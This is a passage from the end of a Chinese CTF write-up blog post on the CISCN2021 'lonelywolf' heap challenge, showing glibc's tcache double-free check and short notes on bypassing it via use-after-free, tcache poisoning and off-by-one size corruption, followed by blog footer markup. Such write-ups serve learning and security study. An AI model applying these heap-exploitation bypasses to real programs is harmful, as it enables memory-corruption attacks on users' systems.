+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(e-&gt;key!=tcache_struct)&amp;&amp;(e <span class="keyword">not</span> in tcache-&gt;entries[tc_idx] )</span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过:</strong></p>
+<p>1.但是我们如果有uaf 可以修改bk，直接不进入这个判断语句就行 if (__glibc_unlikely (e-&gt;key == tcache)</p>
+<p>如果可以修改fd 直接可以tcache 用poisoning不用什么double free</p>
+<p>2.利用off by null、off by one 修改chunk的size 使得进入错的tcache[tc_idx]</p>
+<p>tcache 管理是通过chunk的size 计算出对应的tc_idx，进而找到管理对应大小chunk的tcache链表</p>
+<p>来源：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Theffth-blog/p/12790720.html">Tcache attack学习记录</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>ZouFeIYu
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://erkeai.github.io/2022/05/17/pwn/CISCN2021-lonelywolf/" title="CISCN2021-lonelywolf">https://erkeai.github.io/2022/05/17/pwn/CISCN2021-lonelywolf/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/" rel="tag"># 堆溢出</a>
+              <a href="/tags/tcache/" rel="tag"># tcache</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/05/16/leetcode/%E4%BB%A3%E7%A0%81%E9%9A%8F%E6%83%B3%E5%BD%95%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%A4%A9/" rel="prev" title="代码随想录第三十三天">
+      <i class="fa fa-chevron-left"></i> 代码随想录第三十三天
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/05/17/leetcode/%E4%BB%A3%E7%A0%81%E9%9A%8F%E6%83%B3%E5%BD%95%E7%AC%AC%E4%B8%89%E5%8D%81%E5%9B%9B%E5%A4%A9/" rel="next" title="代码随想录第三十四天">
+      代码随想录第三十四天 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">静态分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#allocate"><span class="nav-number">1.1.</span> <span class="nav-text">allocate</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#edit"><span class="nav-number">1.2.</span> <span class="nav-text">edit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#show"><span class="nav-number">1.3.</span> <span class="nav-text">show</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#delete"><span class="nav-number">1.4.</span> <span class="nav-text">delete</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">利用分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80"><span class="nav-number">2.1.</span> <span class="nav-text">泄露基址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">2.2.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">3.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">4.</span> <span class="nav-text">知识点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#tcache"><span class="nav-number">4.1.</span> <span class="nav-text">tcache</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ZouFeIYu"
+      src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/images%2FhdImg_f7fb2f283d6fd693d9c2444fb73eaf4715853190130.jpg">
+  <p class="site-author-name" itemprop="name">ZouFeIYu</p>
+  <div class="site-description" itemprop="description">reading, coding, travelling</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">95</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">96</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/erkeai" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;erkeai" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:563783592@qq.com" title="E-Mail → mailto:563783592@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-feather"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZouFeIYu</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">222k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:22</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
